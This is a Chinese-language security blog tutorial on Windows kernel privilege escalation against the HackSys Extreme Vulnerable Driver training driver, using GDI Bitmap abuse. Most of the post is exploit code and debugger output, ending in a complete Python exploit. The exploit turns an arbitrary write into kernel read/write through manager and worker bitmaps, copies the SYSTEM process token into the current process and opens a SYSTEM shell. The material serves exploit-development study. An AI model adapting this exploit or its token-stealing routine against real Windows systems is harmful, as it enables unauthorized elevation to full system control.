# Windows特权提升：GDI Bitmap滥用

阅读量 **293356**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-19 12:00:52

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0108ca1c243200b7f0.jpg)

## 0x001 前言

HackSys Extreme Vulnerable Driver是HackSys Team开发的一个Windows Kernel
Exploition训练项目，从2016年开始已经开源在了Github上。整个项目编译好了以后只有一个.sys的驱动文件，通过IrpDeviceIoCtlHandler接收到的从用户态送来的特定命令，选择触发相对应的trigger
method。各个题目的漏洞点比较明确，很适合作为Windows Kernel Exploitation的入门,
Fuzzysecurity上也有一部分题目的分析，无奈是PowerShell版本的，不怎么熟悉，重新用Python实现了一遍。

## 0x002 调试环境

虚拟机：Windows 10 x64 1511 Feb 2016  
主机：Windows 10 x64 1709 Dec 2017  
必要工具：  
1.VirtualKD[[here]](http://virtualkd.sysprogs.org/)  
2.OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)  
3.HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)  
4.Windbg  
5.Vmware  
PS：具体的环境搭建、驱动编译、装载就不多讲了，网上应该不少，Fuzzysecurity上也有详细过程。

## 0x003 Proof of concept

本文，我们学习“GDI Bitmap滥用”，需要利用Arbitrary Write这个洞，用IDA打开驱动文件  
  
很明显，漏洞成因就是把What指向的内容往Where指向地址里写8个byte。

先确保我们能够进到这个trigger method

    
    
    import sys
    from ctypes import *
    
    kernel32 = windll.kernel32
    hevDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)
    
    if not hevDevice or hevDevice == -1:
        print "[-] Couldn't get Device Driver handle."
        sys.exit(0)
    buf = "A"*8 + "B"*8
    buflen = len(buf)
    
    kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
    

得到这样的反馈就是没问题了

    
    
    ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
    [+] UserWriteWhatWhere: 0x0000000002090E18
    [+] WRITE_WHAT_WHERE Size: 0x10
    [+] UserWriteWhatWhere->What: 0x4141414141414141
    [+] UserWriteWhatWhere->Where: 0x4242424242424242
    [+] Triggering Arbitrary Overwrite
    [-] Exception Code: 0xC0000005
    ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
    

## 0x004 How to Exploit it?

学过GDI编程的应该对CreateBitmap这个API不陌生了，具体传入参数如下

    
    
    HBITMAP CreateBitmap（
     _In_ int nWidth，
     _In_ int nHeight，
     _In_ UINT cPlanes，
     _In_ UINT cBitsPerPel，
     _In_ const VOID * lpvBits
    );
    

执行这个脚本，内核会挂起来，然后Windbg附加上去

    
    
    import sys,time
    from ctypes import *
    
    kernel32 = windll.kernel32
    gdi32 = windll.gdi32
    hevDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)
    
    if not hevDevice or hevDevice == -1:
        print "[-] Couldn't get Device Driver handle."
        sys.exit(0)
    
    bmp = gdi32.CreateBitmap(0x64,0x64,1,32)
    print "[+] Bitmap objects Addr: {0}".format(hex(bmp))
    
    kernel32.DebugBreak()
    kernel32.DebugBreak()
    
    while True:
      time.sleep(60*60*24)
    

执行”g”命令，能看到Bitmap返回的句柄被打印出来了

    
    
    C:Userswooy0ung>python C:Userswooy0ungDesktoppoc.py
    [+] Bitmap objects Addr: 0x20050b46
    

接下来，需要找到GdiSharedHandleTable这个表

    
    
    kd> !process 0 0 python.exe
    PROCESS ffffe00058481840
        SessionId: 1  Cid: 0584    Peb: 002ad000  ParentCid: 02f8
        DirBase: 42277000  ObjectTable: ffffc000e4cf6ac0  HandleCount: <Data Not Accessible>
        Image: python.exe
    
    kd> .process ffffe00058481840
    Implicit process is now ffffe000`58481840
    WARNING: .cache forcedecodeuser is not enabled
    kd> .context
    User-mode page directory base is 42277000
    kd> r $peb
    $peb=00000000002ad000
    kd> dt nt!_PEB 00000000002ad000 GdiSharedHandleTable
       +0x0f8 GdiSharedHandleTable : 0x00000000`00b90000 Void
    

GdiSharedHandleTable这个表存放着指向每个Bitmap对应的GDICELL64结构的指针，通过计算获得，ptr =
GdiSharedHandleTable + (handle & 0xffff) *
(x64:0x18,x86:0x10)，handle是CreateBitmap返回的句柄

    
    
    kd> dt nt!_PEB 00000000002ad000 GdiSharedHandleTable
       +0x0f8 GdiSharedHandleTable : 0x00000000`00b90000 Void
    kd> dq 0x00000000`00b90000 + (0x6105104c & 0xffff)*0x18 L3
    00000000`00ba8720  fffff901`44895000 40056105`00000584
    00000000`00ba8730  00000000`00000000
    

那么，0xfffff90144895000便是我们刚刚创建的Bitmap的内核地址，而0x584表示当前进程PID(1412)

可以通过ProcessHacker验证  

创建了一个Bitmap Object，同时间SURFACE
OBJECT(包括BASEOBJECT、SURFOBJECT和pvScan0)也会被创建，其中pvScan0会指向当前SURFACE
OBJECT的像素数据结构  

    
    
    typedef struct {
     BASEOBJECT64   BaseObject;
     SURFOBJ64      SurfObj; 
     .......
    } SURFACE64
    
    typedef struct {
     ULONG64    hHmgr;
     ULONG32    ulShareCount;
     WORD       cExclusiveLock;
     WORD       BaseFlags;
     ULONG64    Tid;
    } BASEOBJECT64;
    
    typedef struct {
     ULONG64    dhsurf;
     ULONG64    hsurf;
     ULONG64    dhpdev;
     ULONG64    hdev;
     SIZEL      sizlBitmap;
     ULONG64    cjBits;
     ULONG64    pvBits;
     ULONG64    pvScan0;
     ULONG32    lDelta;
     ULONG32    iUniq;
     ULONG32    iBitmapFormat;
     USHORT     iType;
     USHORT     fjBitmap;
    } SURFOBJ64
    

现在创建两个Bitmap
Object(hManager和hWorker)，将hManager的pvScan0指针指向hWorker的pvScan0指针的存放地址，可以通过Arbitraty
Write实现  

因此，利用API SetBitmapBits hManager可以任意设置hWorker的pvScan0指针指向地址，而hWorker通过API
SetBitmapBits与GetBitmapBits对内核地址任意读写。

## 0x005 Exploit it!

现在我们来讨论一下脚本该怎么写，首先，获取GdiSharedHandleTable的地址。

    
    
    pbi = PROCESS_BASIC_INFORMATION()
    ntdll.NtQueryInformationProcess.argtypes = (HANDLE, UINT, c_void_p, ULONG, POINTER(ULONG))
    ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, byref(pbi), sizeof(pbi), None)
    peb = pbi.PebBaseAddress.contents
    gdiHandleTable = peb.GdiSharedHandleTable
    print "[+] GdiSharedHandleTable : {0}".format(hex(gdiHandleTable))
    

因为微软没有把NtQuerySystemInformation这个API导出到ntdll，导致一些数据结构在Python上找不到，不能简单的“from
ctypes.wintypes import *”

需要声明PEB、PROCESS_BASIC_INFORMATION和SYSTEM_MODULE_INFORMATION这几个结构

    
    
    class PEB(Structure):
        _fields_ = [("Junk", c_byte * 0xF8),
                    ("GdiSharedHandleTable", c_void_p)]
    
    class PROCESS_BASIC_INFORMATION(Structure):
        _fields_ = [("Reserved1", LPVOID),
                    ("PebBaseAddress", POINTER(PEB)),
                    ("Reserved2", LPVOID * 2),
                    ("UniqueProcessId", c_void_p),
                    ("Reserved3", LPVOID)]
    
    class SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("Reserved", c_void_p * 2),
                    ("ImageBase", c_void_p), 
                    ("ImageSize", c_long),
                    ("Flags", c_ulong),
                    ("LoadOrderIndex", c_ushort),
                    ("InitOrderIndex", c_ushort),
                    ("LoadCount", c_ushort),
                    ("ModuleNameOffset", c_ushort),
                    ("FullPathName", c_char * 256)]
    

查询得到GdiSharedHandleTable地址以后就是创建hManager与hWorker，并得到它们的pvscan0指针地址，利用Arbitrary
Write写入指针

    
    
    ptr = gdiHandleTable + (hManager & 0xFFFF) * sizeof(GDICELL64())
    gdicell64 = cast(ptr, POINTER(GDICELL64))
    hManager_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
    print "[+] hManager_pvscan0_off : {0}".format(hex(hManager_pvscan0_off))
    
    ptr = gdiHandleTable + (hWorker & 0xFFFF) * sizeof(GDICELL64())
    gdicell64 = cast(ptr, POINTER(GDICELL64))
    hWorker_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
    print "[+] hWorker_pvscan0_off  : {0}".format(hex(hWorker_pvscan0_off))
    

写入成功  

最后就是找SYSTEM权限的进程，然后把该进程的Token写入到当前进程，这个不多说了。还需要留意几个重要的偏移，不同版本的Win10上可能不一致.

    
    
    kd> dt _EPROCESS UniqueProcessId ActiveProcessLinks
    ntdll!_EPROCESS
       +0x2e8 UniqueProcessId    : Ptr64 Void
       +0x2f0 ActiveProcessLinks : _LIST_ENTRY
    kd> dt _EPROCESS ImageFileName Token
    ntdll!_EPROCESS
       +0x358 Token         : _EX_FAST_REF
       +0x450 ImageFileName : [15] UChar
    

我这里得到的是

    
    
    token_off = 0x358
    unique_process_id_off = 0x2e8
    active_process_links_off = 0x2f0
    

WIN~  

完整的EXP

    
    
    import sys,time,struct,ctypes,os
    from ctypes import *
    from ctypes.wintypes import *
    from subprocess import *
    from win32com.shell import shell
    import win32con
    
    kernel32 = windll.kernel32
    gdi32 = windll.gdi32
    ntdll = windll.ntdll
    
    hManager = HBITMAP()
    hWorker = HBITMAP()
    
    class PEB(Structure):
        _fields_ = [("Junk", c_byte * 0xF8),
                    ("GdiSharedHandleTable", c_void_p)]
    
    class PROCESS_BASIC_INFORMATION(Structure):
        _fields_ = [("Reserved1", LPVOID),
                    ("PebBaseAddress", POINTER(PEB)),
                    ("Reserved2", LPVOID * 2),
                    ("UniqueProcessId", c_void_p),
                    ("Reserved3", LPVOID)]
    
    class GDICELL64(Structure):
        _fields_ = [("pKernelAddress", c_void_p),
                    ("wProcessId", c_ushort), 
                    ("wCount", c_ushort),
                    ("wUpper", c_ushort),
                    ("wType", c_ushort),
                    ("pUserAddress", c_void_p)]
    
    class SYSTEM_MODULE_INFORMATION(Structure):
        _fields_ = [("Reserved", c_void_p * 2),
                    ("ImageBase", c_void_p), 
                    ("ImageSize", c_long),
                    ("Flags", c_ulong),
                    ("LoadOrderIndex", c_ushort),
                    ("InitOrderIndex", c_ushort),
                    ("LoadCount", c_ushort),
                    ("ModuleNameOffset", c_ushort),
                    ("FullPathName", c_char * 256)]
    
    def write_mem(dest, src, length):
        global hManager
        global hWorker
    
        write_buf = c_ulonglong(dest)
        gdi32.SetBitmapBits(HBITMAP(hManager), c_ulonglong(sizeof(write_buf)), LPVOID(addressof(write_buf)));
        gdi32.SetBitmapBits(HBITMAP(hWorker), c_ulonglong(length), src)
    
    def read_mem(src, dest, length):
        global hManager
        global hWorker
    
        write_buf = c_ulonglong(src)
        gdi32.SetBitmapBits(HBITMAP(hManager), c_ulonglong(sizeof(write_buf)), LPVOID(addressof(write_buf)));
        gdi32.GetBitmapBits(HBITMAP(hWorker), c_ulonglong(length), dest)
    
    def find_kernelBase(input_modules):
        modules = {}
    
        # Allocate arbitrary buffer and call NtQuerySystemInformation
        system_information = create_string_buffer(0)
        systeminformationlength = c_ulong(0)
        ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
    
        # Call NtQuerySystemInformation second time with right size
        system_information = create_string_buffer(systeminformationlength.value)
        ntdll.NtQuerySystemInformation(11, system_information, len(system_information), byref(systeminformationlength))
    
        # Read first 4 bytes which contains number of modules retrieved
        module_count = c_ulong(0)
        module_count_string = create_string_buffer(system_information.raw[:8])
        ctypes.memmove(addressof(module_count), module_count_string, sizeof(module_count))
    
        # Marshal each module information and store it in a dictionary<name, SYSTEM_MODULE_INFORMATION>
        system_information = create_string_buffer(system_information.raw[8:])
        for x in range(module_count.value):
            smi = SYSTEM_MODULE_INFORMATION()
            temp_system_information = create_string_buffer(system_information.raw[sizeof(smi) * x: sizeof(smi) * (x+1)])
            ctypes.memmove(addressof(smi), temp_system_information, sizeof(smi))
            module_name =  smi.FullPathName.split('\')[-1]
            modules[module_name] = smi
    
        #debug_print ("rn[+] NtQuerySystemInformation():")
    
        # Get base addresses and return them in a list
        base_addresses = []
        for input_module in input_modules:
            try:
                base_address = modules[input_module].ImageBase
                #debug_print ("t[-] %s base address: 0x%X" % (input_module, base_address))
                base_addresses.append(base_address)
            except:
                base_addresses.append(0)
    
        return base_addresses
    
    def main():
        global hManager
        global hWorker
    
        hevDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver",0xc0000000,0,None,0x3,0,None)
    
        if not hevDevice or hevDevice == -1:
            print "[-] Couldn't get Device Driver handle."
            sys.exit(0)
    
    
        gdi32.CreateBitmap.restype = HBITMAP
        hManager = gdi32.CreateBitmap(0x64, 0x64, 1, 32, c_void_p())
        hWorker = gdi32.CreateBitmap(0x64, 0x64, 1, 32, c_void_p())
        print "[+] hManager Handle      : {0}".format(hex(hManager))
        print "[+] hWorker Handle       : {0}".format(hex(hWorker))
    
    
        pbi = PROCESS_BASIC_INFORMATION()
        ntdll.NtQueryInformationProcess.argtypes = (HANDLE, UINT, c_void_p, ULONG, POINTER(ULONG))
        ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, byref(pbi), sizeof(pbi), None)
        peb = pbi.PebBaseAddress.contents
        gdiHandleTable = peb.GdiSharedHandleTable
        print "[+] GdiSharedHandleTable : {0}".format(hex(gdiHandleTable))
    
    
        ptr = gdiHandleTable + (hManager & 0xFFFF) * sizeof(GDICELL64())
        gdicell64 = cast(ptr, POINTER(GDICELL64))
        hManager_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
        print "[+] hManager_pvscan0_off : {0}".format(hex(hManager_pvscan0_off))
    
        ptr = gdiHandleTable + (hWorker & 0xFFFF) * sizeof(GDICELL64())
        gdicell64 = cast(ptr, POINTER(GDICELL64))
        hWorker_pvscan0_off = gdicell64.contents.pKernelAddress + 0x50
        print "[+] hWorker_pvscan0_off  : {0}".format(hex(hWorker_pvscan0_off))
    
    
        write_where = struct.pack("<Q", hManager_pvscan0_off)
        write_what_object = struct.pack("<Q", hWorker_pvscan0_off)
        write_what_object_ptr = id(write_what_object) + 0x20
        write_what_final = struct.pack("<Q", write_what_object_ptr)
        buf = write_what_final + write_where
        buflen = len(buf)
        kernel32.DeviceIoControl(hevDevice,0x22200B,buf,buflen,None,0,byref(c_ulong()),None)
    
    
        kernelImage = "ntoskrnl.exe"
        kernelImageBase = find_kernelBase(kernelImage.split())[0]
    
        kernel32.LoadLibraryA.restype = HMODULE
        hKernelImage = kernel32.LoadLibraryA(kernelImage)
        print "[+] Module Name                                  : {0}".format(kernelImage)
        print "[+] Module Base(Userland)                        : {0}".format(hex(hKernelImage))
    
        kernel32.GetProcAddress.restype = c_ulonglong
        kernel32.GetProcAddress.argtypes = (HMODULE, LPCSTR)
        PsISP_user_addr = kernel32.GetProcAddress(hKernelImage,"PsInitialSystemProcess")
        print "[+] PsInitialSystemProcess Userland Base Address : {0}".format(hex(PsISP_user_addr))
    
        PsISP_kernel_addr_ptr = kernelImageBase + (PsISP_user_addr - hKernelImage)
        print "[+] PsInitialSystemProcess Kernel Base Address   : {0}".format(hex(PsISP_kernel_addr_ptr))
    
        PsISP_kernel_addr = c_ulonglong()
        read_mem(PsISP_kernel_addr_ptr, byref(PsISP_kernel_addr), sizeof(PsISP_kernel_addr));
        SYSTEM_EPROCESS = PsISP_kernel_addr.value
        print "[+] SYSTEM EPROCESS                              : {0}".format(hex(SYSTEM_EPROCESS))
    
    
        token_off = 0x358
        unique_process_id_off = 0x2e8
        active_process_links_off = 0x2f0
    
        flink = c_ulonglong()
        read_mem(SYSTEM_EPROCESS + active_process_links_off, byref(flink), sizeof(flink)); 
    
        CURRENT_EPROCESS = 0
        while (True):
            unique_process_id = c_ulonglong(0)
    
            # Adjust EPROCESS pointer for next entry
            EPROCESS = flink.value - unique_process_id_off - 0x8
    
            read_mem(EPROCESS + unique_process_id_off, byref(unique_process_id), sizeof(unique_process_id));    
    
            # Check if we're in the current process
            if (os.getpid() == unique_process_id.value):
                CURRENT_EPROCESS = EPROCESS
                break
    
            read_mem(EPROCESS + active_process_links_off, byref(flink), sizeof(flink)); 
    
            # If next same as last, we've reached the end
            if (EPROCESS == flink.value - unique_process_id_off - 0x8):
                break
        print "[+] CURRENT EPROCESS                             : {0}".format(hex(CURRENT_EPROCESS))
    
        system_token = c_ulonglong()
        read_mem(SYSTEM_EPROCESS + token_off, byref(system_token), sizeof(system_token));
        write_mem(CURRENT_EPROCESS + token_off, byref(system_token), sizeof(system_token));
    
        Popen("start cmd", shell=True)
    
    if __name__ == "__main__":
        main()
    

## 0x006 参考文章

[Part 17: Kernel Exploitation -> GDI Bitmap Abuse (Win7-10
32/64bit)](http://www.fuzzysecurity.com/tutorials/expDev/21.html)  
[Window Kernel Exploit -> GDI Bitmap Abuse](http://gflow.co.kr/window-kernel-exploit-gdi-bitmap-abuse/)  
[Techwiki:Win32k/BASEOBJECT](https://www.reactos.org/wiki/Techwiki:Win32k/BASEOBJECT)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wooy0ung** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/156519](/post/id/156519)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [windows10](/tag/windows10)
  * [Kernel](/tag/Kernel)
  * [Bitmap](/tag/Bitmap)

 **+1** __5赞

 __收藏

![](https://p1.ssl.qhimg.com/t0131de115972950e64.png) wooy0ung

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

